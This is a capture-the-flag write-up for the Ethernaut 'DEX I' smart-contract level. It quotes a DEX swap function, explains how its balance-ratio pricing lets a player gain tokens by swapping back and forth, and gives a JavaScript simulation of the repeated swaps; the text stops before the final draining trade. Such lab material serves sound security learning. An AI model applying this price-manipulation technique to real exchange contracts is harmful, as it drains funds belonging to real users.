# [22. DEX I](https://ethernaut.openzeppelin.com/level/0xC084FC117324D7C628dBC41F17CAcAaF4765f49e)

In this level, we have a Decentralized Exchange (DEX) contract. In my instance, these are the two tokens of the DEX:

- token 1: [0xc0C87488841BF66e402F431853b100A735c1db73](https://rinkeby.etherscan.io/address/0xc0C87488841BF66e402F431853b100A735c1db73)
- token 2: [0x7EdAC717C9f67727c9c13B78AcC89B7f84dcEedb](https://rinkeby.etherscan.io/address/0x7EdAC717C9f67727c9c13B78AcC89B7f84dcEedb)

We can check that we have a bit of both tokens:

```js
// we have 10 of both tokens
(await contract.balanceOf(await contract.token1(), player)).toString()
(await contract.balanceOf(await contract.token2(), player)).toString()
// DEX has 100 of both tokens
(await contract.balanceOf(await contract.token1(), contract.address)).toString()
(await contract.balanceOf(await contract.token2(), contract.address)).toString()
```

We are asked to "drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a _bad_ price of the assets". Let us take a deeper look into the swap function then:

```solidity
function swap(address from, address to, uint amount) public {
  // token addresses must be valid
  require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");

  // sender must have enough balance of FROM
  require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");

  // calculate the price, we can inline the actual formula here
  // uint swapAmount = getSwapPrice(from, to, amount);
  uint swapAmount = (
    (amount * IERC20(to).balanceOf(address(this))) /
              IERC20(from).balanceOf(address(this))
    );

  // DEX takes "amount" tokens from us
  IERC20(from).transferFrom(msg.sender, address(this), amount);

  // DEX gives "swapAmount" tokens to us
  IERC20(to).approve(address(this), swapAmount);
  IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
}
```

There aren't any obvious attack vectors so far, so let us delve a bit more into the swapping formula. Let $d_t$ and $p_t$ denote the balance of DEX and Player for token $t$ respectively, $a$ denote amount, and $s$ denote swap amount.

Since we have equal amount of both, without loss of generality let us swap all of our token 1:

$$
a_s = b_1 \times \frac{d_{2}}{d_{1}} = 10 \times \frac{100}{100} = 10
$$

Giving us $b_1 = 0, b_2 = 20, d_1 = 110, d_2 = 90$, that is, we traded 10 of one token to 10 of the other. Now let us do the opposite with the new balances:

$$
a_s = b_2 \times \frac{d_{1}}{d_{2}} = 20 \times \frac{110}{90} = 24.44
$$

Woah! We just got 24.44 tokens for giving 20, even though they were treated equally in the previous trade. What if we do this once more? We have $b_1 = 24.44, b_2 = 0, d_1 = 86,6, d_2 = 110$

$$
a_s = b_1 \times \frac{d_{2}}{d_{1}} = 24.4 \times \frac{110}{86,6} = 30.99
$$

We got even more than 24.4 tokens! Let us try to simulate this with JS real quick and see if this goes on:

```js
function price(to_dex, from_dex, amount) {
  return amount * to_dex / from_dex
}
function simulate(t1_dex, t2_dex, t1_player, t2_player, maxiters = 5) {
  let sp; // swap price 
  console.log(`Start\n\tD1: ${t1_dex}\n\tD2: ${t2_dex}\n\tP1: ${t1_player}\n\tP2: ${t2_player}`)
  for (i = 1; i != maxiters && t1_dex > 0 && t2_dex > 0; ++i) {
    if (i % 2) {
      // trade t1 to t2
      a = t1_player
      sa = price(t2_dex, t1_dex, a)

      // from (t1) changes for a amounts
      t1_player -= a;
      t1_dex += a;

      // to (t2) changes for sa amounts
      t2_player += sa;
      t2_dex -= sa;
    } else {
      // trade t2 to t1
      a = t2_player
      sa = price(t1_dex, t2_dex, a)

      // from (t2) changes for a amounts
      t2_player -= a;
      t2_dex += a;

      // to (t1) changes for sa amounts 
      t1_player += sa;
      t1_dex -= sa;
    }
    console.log(`i = ${i}\n\tD1: ${t1_dex}\n\tD2: ${t2_dex}\n\tP1: ${t1_player}\n\tP2: ${t2_player}`)
    
  }
}

simulate(100, 100, 10, 10);
```

When we run the simulation above with a high number of iterations, we see that on the 6th trade we get negative values for some token. That means, if we adjust the amount on that trade, we can make DEX balance for one of the tokens to be 0.
